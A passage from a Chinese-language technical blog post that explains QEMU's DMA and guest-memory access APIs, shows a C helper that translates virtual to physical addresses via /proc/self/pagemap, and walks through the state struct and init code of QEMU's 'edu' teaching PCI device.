len)</span>;</span><br><span class="line"></span><br><span class="line">MemTxResult <span class="title function_">address_space_rw</span><span class="params">(AddressSpace *as, hwaddr addr,</span></span><br><span class="line"><span class="params">                             MemTxAttrs attrs, <span class="type">void</span> *buf, <span class="type">size_t</span> len,</span></span><br><span class="line"><span class="params">                             <span class="type">bool</span> is_write)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数说明</strong></p>
<ul>
<li><p><code>as</code>：要访问的<strong>地址空间</strong>。常见有：</p>
<ul>
<li>系统物理内存（system memory）的 <code>AddressSpace</code>（例如 <code>&amp;address_space_memory</code>）；</li>
<li>I&#x2F;O 地址空间；</li>
<li>经过 <strong>IOMMU</strong> 翻译后的 <strong>DMA AddressSpace</strong>（比如为某个总线&#x2F;设备创建的 DMA AS）。</li>
</ul>
</li>
<li><p><code>addr</code>：在该 <code>AddressSpace</code> 内的<strong>起始物理地址&#x2F;IO 地址</strong>。</p>
</li>
<li><p><code>attrs</code>：<strong>事务属性</strong>（<code>MemTxAttrs</code>），通常写 <code>MEMTXATTRS_UNSPECIFIED</code>。它会随访问传递，供内存监听器、IOMMU 等子系统解读（比如是否可被合并、缓存属性、发起者信息等，具体随目标体系结构&#x2F;设备而定）。</p>
</li>
<li><p><code>buf</code> &#x2F; <code>len</code>：读&#x2F;写的用户缓冲区与长度；读时把目标内容拷贝到 <code>buf</code>，写时从 <code>buf</code> 拷贝到目标。</p>
</li>
<li><p><code>is_write</code>：仅对 <code>address_space_rw()</code>，<code>true</code>&#x3D;写，<code>false</code>&#x3D;读。</p>
</li>
</ul>
<p><strong>返回值（错误处理）</strong></p>
<ul>
<li>返回 <code>MemTxResult</code>：<strong>成功</strong>为“OK”（不同版本的枚举名略有差别，但你可以把“非 OK”都当错误处理），失败表示访问异常、解码失败（地址无映射&#x2F;被拒）、或设备侧报错。</li>
<li>实践建议：<strong>判是否为 OK</strong>，错误时在设备里置位 DMA 错误、触发中断或按设备规范处理。</li>
</ul>
<p><strong>使用场景</strong></p>
<ul>
<li>你<strong>已经知道</strong>要访问哪个 <code>AddressSpace</code>（例如已拿到“某设备的 DMA 地址空间”），并希望以<strong>统一 API</strong>发起读&#x2F;写。</li>
</ul>
<h4 id="dma-memory-read-dma-memory-write（设备发起-DMA-时优先用）"><a href="#dma-memory-read-dma-memory-write（设备发起-DMA-时优先用）" class="headerlink" title="dma_memory_read &#x2F; dma_memory_write（设备发起 DMA 时优先用）"></a><code>dma_memory_read</code> &#x2F; <code>dma_memory_write</code>（设备发起 DMA 时优先用）</h4><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 简化：attrs 固定为未指定，返回 int（0=成功，负数=错误） */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">dma_memory_read</span><span class="params">(AddressSpace *as, <span class="type">dma_addr_t</span> addr, <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">dma_memory_write</span><span class="params">(AddressSpace *as, <span class="type">dma_addr_t</span> addr, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 完整：可携带 attrs，返回 MemTxResult（更细的错误语义） */</span></span><br><span class="line">MemTxResult <span class="title function_">dma_memory_read_with_attrs</span><span class="params">(AddressSpace *as, <span class="type">dma_addr_t</span> addr,</span></span><br><span class="line"><span class="params">                                       <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len, MemTxAttrs attrs)</span>;</span><br><span class="line">MemTxResult <span class="title function_">dma_memory_write_with_attrs</span><span class="params">(AddressSpace *as, <span class="type">dma_addr_t</span> addr,</span></span><br><span class="line"><span class="params">                                        <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len, MemTxAttrs attrs)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数说明</strong></p>
<ul>
<li><code>as</code>：<strong>DMA 使用的 AddressSpace</strong>。若系统存在 IOMMU，请确保这里传的是<strong>IOMMU 后的 DMA AS</strong>（否则就绕过了 IOMMU，不符合真实硬件）。</li>
<li><code>addr</code>：<strong>DMA 地址</strong>（设备视角下的地址）。</li>
<li><code>buf</code> &#x2F; <code>len</code>：同上。</li>
<li><code>attrs</code>：同上；大多数设备用 <code>MEMTXATTRS_UNSPECIFIED</code> 就好。</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li>简化版返回 <code>int</code>（0 成功，&lt;0 失败）；<code>*_with_attrs</code> 返回 <code>MemTxResult</code>。</li>
</ul>
<blockquote>
<p><strong>DMA（Direct Memory Access，直接内存访问）</strong> 是指<strong>外设</strong>（比如网卡&#x2F;存储&#x2F;显卡&#x2F;PCIe 设备）<strong>绕过 CPU</strong>，直接在<strong>来宾的内存地址空间里读&#x2F;写数据</strong>的一种机制。</p>
<p>在 QEMU 设备模型里，“设备做 DMA”&#x3D; 你的设备代码主动去读&#x2F;写 Guest（或经 IOMMU 翻译后的 I&#x2F;O 虚拟地址，IOVA）里的缓冲区。</p>
<ul>
<li><strong>CPU 访存</strong>：Guest 的 CPU 执行指令触发访存（load&#x2F;store），QEMU 根据地址落到 RAM 或 MMIO；MMIO 会调用你的 <code>MemoryRegionOps.read/write</code> 回调。</li>
<li><strong>DMA 访存</strong>：<strong>设备本身</strong>发起内存传输（比如把网卡收到的数据写到来宾内存中的 ring buffer），在 QEMU 里表现为<strong>设备模型主动调用</strong> <code>dma_memory_read/write</code>（或 <code>pci_dma_read/write</code>）。</li>
</ul>
</blockquote>
<h4 id="PCI-专用：pci-dma-read-pci-dma-write"><a href="#PCI-专用：pci-dma-read-pci-dma-write" class="headerlink" title="PCI 专用：pci_dma_read &#x2F; pci_dma_write"></a>PCI 专用：<code>pci_dma_read</code> &#x2F; <code>pci_dma_write</code></h4><p>这两个函数用于<strong>PCI 设备发起 DMA</strong>：从设备视角用 <strong>IOVA&#x2F;DMA 地址</strong> 去读&#x2F;写来宾内存的数据。它们会<strong>根据 <code>dev</code> 自动选择正确的 DMA AddressSpace</strong>（考虑 IOMMU&#x2F;ATS 等），比你自己拿 <code>AddressSpace</code> 更不容易出错。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pci_dma_read</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr, <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pci_dma_write</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数说明</strong></p>
<ul>
<li><p><code>dev</code>: 发起 DMA 的 <code>PCIDevice *</code>（你的设备对象）。</p>
</li>
<li><p><code>addr</code>: <code>dma_addr_t</code>，<strong>设备看到的 DMA 地址</strong>（通常是 IOVA；没有 IOMMU 时等同于来宾物理地址）。</p>
</li>
<li><p><code>buf</code>: 主机侧缓冲区指针。</p>
<ul>
<li><code>pci_dma_read</code>：<strong>输出缓冲</strong>（把来宾内存读到这里）。</li>
<li><code>pci_dma_write</code>：<strong>输入缓冲</strong>（把这里的数据写到来宾内存）。</li>
</ul>
</li>
<li><p><code>len</code>: 传输字节数（<code>dma_addr_t</code> 类型以便支持 64 位长度）。</p>
</li>
</ul>
<p><strong>返回值</strong></p>
<ul>
<li><p><strong><code>0</code><strong>：整段传输</strong>成功</strong>（等价于底层 <code>MemTxResult == MEMTX_OK</code>）。</p>
</li>
<li><p><strong>非 0（通常为 <code>-1</code>）</strong>：传输<strong>失败</strong>（底层不是 <code>MEMTX_OK</code>）。</p>
<ul>
<li>不保证设置 <code>errno</code>；<strong>不要</strong>依赖 <code>errno</code>。</li>
<li>失败原因可能是：IOMMU 翻译失败&#x2F;权限拒绝、地址未映射（解码失败）、目标 MemoryRegion 报错、越界等。</li>
</ul>
</li>
<li><p><strong>没有“部分成功”的返回</strong>：要么成功完成 <code>len</code> 字节，要么失败（如果你需要部分长度语义，就改用 <code>address_space_map/unmap</code> 循环搬运，或把大块拆小分段重试）。</p>
</li>
</ul>
<p><strong>特点</strong></p>
<ul>
<li>会基于 <code>dev</code> 选择<strong>正确的 DMA AddressSpace</strong>（考虑 IOMMU&#x2F;ATS 等），避免你手动找 AS 出错。</li>
<li>语义与 <code>dma_memory_*</code> 等价，但更贴近“PCI 设备发起 DMA”的常见场景。</li>
</ul>
<p>另外有的版本的 QEMU 还会提供带 <code>MemTxResult</code> 属性的 <code>pci_dma_*</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 也有带属性版本（有的分支/头文件里提供）：*/</span></span><br><span class="line">MemTxResult <span class="title function_">pci_dma_read_with_attrs</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr,</span></span><br><span class="line"><span class="params">                                    <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len, MemTxAttrs attrs)</span>;</span><br><span class="line">MemTxResult <span class="title function_">pci_dma_write_with_attrs</span><span class="params">(PCIDevice *dev, <span class="type">dma_addr_t</span> addr,</span></span><br><span class="line"><span class="params">                                     <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len, MemTxAttrs attrs)</span>;</span><br></pre></td></tr></table></figure></div>

<p>对于这种形式的 API，返回值：</p>
<ul>
<li><p>**<code>MEMTX_OK</code>**：成功。</p>
</li>
<li><p><strong>其他（<code>MEMTX_ERROR</code> &#x2F; <code>MEMTX_DECODE_ERROR</code> &#x2F; <code>MEMTX_ACCESS_FAILED</code> 等，名称因分支略有差异）</strong>：失败。</p>
<ul>
<li><p>含义粗略理解即可：</p>
<ul>
<li><code>DECODE_ERROR</code>：地址解码失败&#x2F;未映射；</li>
<li><code>ACCESS_FAILED</code>：权限&#x2F;IOMMU&#x2F;设备拒绝；</li>
<li><code>ERROR</code>：其它错误。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>判错策略</strong>：把“非 <code>MEMTX_OK</code>”都当失败处理即可。</p>
</li>
</ul>
<h4 id="cpu-physical-memory"><a href="#cpu-physical-memory" class="headerlink" title="cpu_physical_memory_*"></a><code>cpu_physical_memory_*</code></h4><p><code>cpu_physical_memory_*</code> 是 QEMU 的“上帝视角”<strong>直接访问来宾“系统物理内存地址空间”</strong>（<code>system_memory</code>）的工具函数。</p>
<ul>
<li>它们<strong>不经过 IOMMU</strong>、<strong>不做设备权限检查</strong>、也<strong>不触发设备的 MMIO 回调</strong>。</li>
<li>典型用途：<strong>monitor&#x2F;调试&#x2F;固件加载&#x2F;快照工具</strong>等“宿主侧主动”对 Guest 物理内存做读写。</li>
<li><strong>不要</strong>用它们在<strong>设备模型</strong>里模拟 DMA&#x2F;寄存器访问（会偏离真实硬件路径）。</li>
</ul>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_read</span><span class="params">(hwaddr addr, <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_write</span><span class="params">(hwaddr addr, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> len)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">cpu_physical_memory_rw</span><span class="params">(hwaddr addr, <span class="type">void</span> *buf, <span class="type">size_t</span> len, <span class="type">int</span> is_write)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">cpu_physical_memory_map</span><span class="params">(hwaddr addr, hwaddr *plen, <span class="type">int</span> is_write)</span>;</span><br><span class="line"><span class="type">void</span>  <span class="title function_">cpu_physical_memory_unmap</span><span class="params">(<span class="type">void</span> *host_ptr, hwaddr len, <span class="type">int</span> is_write, hwaddr access_len)</span>;</span><br></pre></td></tr></table></figure></div>

<p><strong>参数说明</strong></p>
<ul>
<li><code>addr: hwaddr</code> 目标<strong>来宾物理地址</strong>（system_memory 的物理地址，不是 IOVA，不是虚拟地址）。</li>
<li><code>buf: void* / const void*</code> 主机侧缓冲区指针。<code>read</code>&#x2F;<code>rw(is_write=0)</code> 为<strong>输出</strong>缓冲，<code>write</code>&#x2F;<code>rw(is_write=1)</code> 为<strong>输入</strong>缓冲。</li>
<li><code>len: size_t</code> 读&#x2F;写的<strong>字节数</strong>。可以很大，函数内部会自动跨页&#x2F;跨 region 逐段处理。</li>
<li><code>is_write: int</code>（仅 <code>rw</code>）<code>0</code>&#x3D;读，非 <code>0</code>&#x3D;写。</li>
</ul>
<p><strong>返回&#x2F;错误行为</strong></p>
<ul>
<li><p>这些函数<strong>没有返回值</strong>，不会把错误以返回码形式告诉你。</p>
</li>
<li><p>当访问到未映射&#x2F;被拒绝的区域时，不同版本&#x2F;路径一般会：</p>
<ul>
<li><strong>读</strong>：把对应字节视作 <strong>0</strong>（复制 0 到 <code>buf</code> 的那段）；</li>
<li><strong>写</strong>：<strong>丢弃</strong>那部分写入（相当于没写成功）。</li>
</ul>
</li>
<li><p>因此用于<strong>调试&#x2F;加载</strong>没问题，但 <strong>不要</strong>拿它判断“访问是否真的成功”，也不要用来模拟设备行为。</p>
</li>
</ul>
<h3 id="内存地址转换-1"><a href="#内存地址转换-1" class="headerlink" title="内存地址转换"></a>内存地址转换</h3><p>Linux 在<strong>用户态</strong>（有高权限）可以用 <code>/proc/&lt;pid&gt;/pagemap</code> 获取<strong>内存地址（虚拟地址）</strong>对应的<strong>物理地址</strong>。</p>
<p>Linux 提供 pagemap 接口，可把某进程的<strong>虚拟页</strong>映射到<strong>页帧号 PFN</strong>，再算出物理地址：</p>
<p><strong>物理地址 &#x3D; PFN × 页大小 + 页内偏移</strong>。</p>
<p>自 Linux 4.0 起，<strong>未授予 <code>CAP_SYS_ADMIN</code> 时 PFN 会被屏蔽&#x2F;置零</strong>（防范 Rowhammer 等攻击，4.0–4.1 未授权直接 <code>open</code> 失败，4.2+ 则 PFN 字段置零），因此要么用 root、要么给程序授予该能力，否则得不到 PFN。</p>
<p>pagemap 64 位项的位义（简化）如下：</p>
<ul>
<li>bit63&#x3D;present，</li>
<li>bit62&#x3D;swapped，</li>
<li>bits 0–54 为 PFN（在 present 时有效）</li>
</ul>
<p><strong>内存地址（虚拟地址）</strong>转换<strong>物理地址</strong>的具体步骤为：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">virt_to_phys</span><span class="params">(<span class="type">void</span> *vaddr)</span> &#123;</span><br><span class="line">    <span class="type">long</span> pagesize = sysconf(_SC_PAGESIZE);</span><br><span class="line">    <span class="type">uint64_t</span> va = (<span class="type">uint64_t</span>)vaddr;</span><br><span class="line">    <span class="type">uint64_t</span> page_index = va / pagesize;</span><br><span class="line">    <span class="type">uint64_t</span> offset = page_index * <span class="keyword">sizeof</span>(<span class="type">uint64_t</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> entry = <span class="number">0</span>;</span><br><span class="line">    <span class="type">ssize_t</span> n = pread(fd, &amp;entry, <span class="keyword">sizeof</span>(entry), offset);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(entry)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(entry &amp; (<span class="number">1ULL</span> &lt;&lt; <span class="number">63</span>)) || (entry &amp; (<span class="number">1ULL</span> &lt;&lt; <span class="number">62</span>))) &#123; <span class="comment">// not present or swapped</span></span><br><span class="line">        errno = EFAULT;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint64_t</span> pfn = entry &amp; ((<span class="number">1ULL</span> &lt;&lt; <span class="number">55</span>) - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> (pfn * pagesize) + (va % pagesize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li><strong>确保页已驻留</strong>（否则 present&#x3D;0）：触碰一次该地址或用 <code>mlock()</code> 将其锁入内存。</li>
<li>打开 <code>/proc/self/pagemap</code>（或 <code>/proc/&lt;pid&gt;/pagemap</code>），按“<strong>页索引×8</strong>”偏移读取一个 64 位条目；偏移和读大小必须是 8 的倍数。</li>
<li>检查 bit63（present）。若不在内存或 bit62（swapped）为 1，就无法得到当前物理地址。</li>
<li>取 PFN（条目低 55 位）。</li>
<li>计算物理地址：<code>phys = (PFN &lt;&lt; PAGE_SHIFT) | (va &amp; (page_size-1))</code>。</li>
</ol>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>mmap 本身不会立即分配物理页</strong>，Linux 默认按需分配（首次访问触发缺页才真正拿到物理页）。因此直接 <code>mmap</code> 分配的匿名页通过 <code>/proc/self/pagemap</code> 查询不到对应的物理地址。</p>
<p><strong>mmap 时加 MAP_POPULATE（“预触发”）</strong>对于<strong>可写的、私有、匿名映射</strong>（典型组合：<code>MAP_PRIVATE|MAP_ANONYMOUS</code> + <code>PROT_READ|PROT_WRITE</code>），Linux 在处理 <code>MAP_POPULATE</code> 时，会走“<strong>写缺页</strong>”的预触发路径，把每一页都<strong>像被写过一样</strong>提前 fault 进来，从而<strong>为每一页分配匿名物理页</strong>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *p = mmap(<span class="literal">NULL</span>, len, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<h2 id="QEMU-设备分析"><a href="#QEMU-设备分析" class="headerlink" title="QEMU 设备分析"></a>QEMU 设备分析</h2><h3 id="PCI-设备-1"><a href="#PCI-设备-1" class="headerlink" title="PCI 设备"></a>PCI 设备</h3><h4 id="设备实例定义"><a href="#设备实例定义" class="headerlink" title="设备实例定义"></a>设备实例定义</h4><p>首先是设备的 <code>State</code> 结构体，该结构体即设备的 <code>Object</code> 中自身的部分，包含了设备自身定义的全部相关结构。关于设备的操作都是围绕这个结构体展开的。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_PCI_EDU_DEVICE <span class="string">&quot;edu&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDU(obj)        OBJECT_CHECK(EduState, obj, TYPE_PCI_EDU_DEVICE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FACT_IRQ        0x00000001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_IRQ         0x00000100</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_START       0x40000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_SIZE        4096</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    PCIDevice pdev;</span><br><span class="line">    MemoryRegion mmio;</span><br><span class="line"></span><br><span class="line">    QemuThread thread;</span><br><span class="line">    QemuMutex thr_mutex;</span><br><span class="line">    QemuCond thr_cond;</span><br><span class="line">    <span class="type">bool</span> stopping;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> addr4;</span><br><span class="line">    <span class="type">uint32_t</span> fact;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDU_STATUS_COMPUTING    0x01</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDU_STATUS_IRQFACT      0x80</span></span><br><span class="line">    <span class="type">uint32_t</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> irq_status;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDU_DMA_RUN             0x1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDU_DMA_DIR(cmd)        (((cmd) &amp; 0x2) &gt;&gt; 1)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EDU_DMA_FROM_PCI       0</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EDU_DMA_TO_PCI         1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDU_DMA_IRQ             0x4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dma_state</span> &#123;</span></span><br><span class="line">        <span class="type">dma_addr_t</span> src;</span><br><span class="line">        <span class="type">dma_addr_t</span> dst;</span><br><span class="line">        <span class="type">dma_addr_t</span> cnt;</span><br><span class="line">        <span class="type">dma_addr_t</span> cmd;</span><br><span class="line">    &#125; dma;</span><br><span class="line">    QEMUTimer dma_timer;</span><br><span class="line">    <span class="type">char</span> dma_buf[DMA_SIZE];</span><br><span class="line">    <span class="type">uint64_t</span> dma_mask;</span><br><span class="line">&#125; EduState;</span><br></pre></td></tr></table></figure></div>

<h4 id="设备类型定义"><a href="#设备类型定义" class="headerlink" title="设备类型定义"></a>设备类型定义</h4><p>其次是设备的 <code>TypeInfo</code> ，重点关注其中的 <code>instance_init</code>，<code>class_init</code>等初始化函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_edu_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> InterfaceInfo interfaces[] = &#123;</span><br><span class="line">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span><br><span class="line">        &#123; &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo edu_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_EDU_DEVICE,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(EduState),</span><br><span class="line">        .instance_init = edu_instance_init,</span><br><span class="line">        .class_init    = edu_class_init,</span><br><span class="line">        .interfaces = interfaces,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    type_register_static(&amp;edu_info);</span><br><span class="line">&#125;</span><br><span class="line">type_init(pci_edu_register_types)</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>instance_size</code> 告诉 QOM：创建这个对象时需要分配多大的一块内存（也就是 <code>EduState</code> 的大小）。</li>
<li><code>class_init</code> 在<strong>类级别</strong>设置默认回调（例如把 <code>PCIDeviceClass::realize</code> 指到 <code>pci_edu_realize</code>）。</li>
<li><code>instance_init</code> 在<strong>实例级别</strong>设字段默认值、注册 QOM 属性等（必须不失败）。</li>
</ul>
<blockquote>
<p>当你在命令行 <code>-device edu</code> 或在代码里新增这个设备时，QEMU 会：</p>
<ol>
<li>分配一块大小为 <code>sizeof(EduState)</code> 的零清内存；</li>
<li>构造父类子对象（因为 <code>EduState</code> 的第一个成员是 <code>PCIDevice pdev;</code>，这就是“内嵌继承”）；</li>
<li>调用 <code>edu_instance_init()</code> 给实例字段设缺省值、注册属性（如 <code>dma_mask</code>）。</li>
</ol>
</blockquote>
<h4 id="设备初始化操作"><a href="#设备初始化操作" class="headerlink" title="设备初始化操作"></a>设备初始化操作</h4><p>从设备的 <code>class_init</code> 和 <code>instance_init</code> 等初始化函数中我们可以获取到设备的相关信息。其中 <code>realize</code> 和 <code>exit</code> 函数定义了一部分 <code>Object</code> 初始化和销毁操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edu_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    EduState *edu = EDU(obj);</span><br><span class="line"></span><br><span class="line">    edu-&gt;dma_mask = (<span class="number">1UL</span> &lt;&lt; <span class="number">28</span>) - <span class="number">1</span>;</span><br><span class="line">    object_property_add_uint64_ptr(obj, <span class="string">&quot;dma_mask&quot;</span>,</span><br><span class="line">                                   &amp;edu-&gt;dma_mask, OBJ_PROP_FLAG_READWRITE,</span><br><span class="line">                                   <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">edu_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    DeviceClass *dc = DEVICE_CLASS(class);</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_edu_realize;</span><br><span class="line">    k-&gt;<span class="built_in">exit</span> = pci_edu_uninit;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e8</span>;</span><br><span class="line">    k-&gt;revision = <span 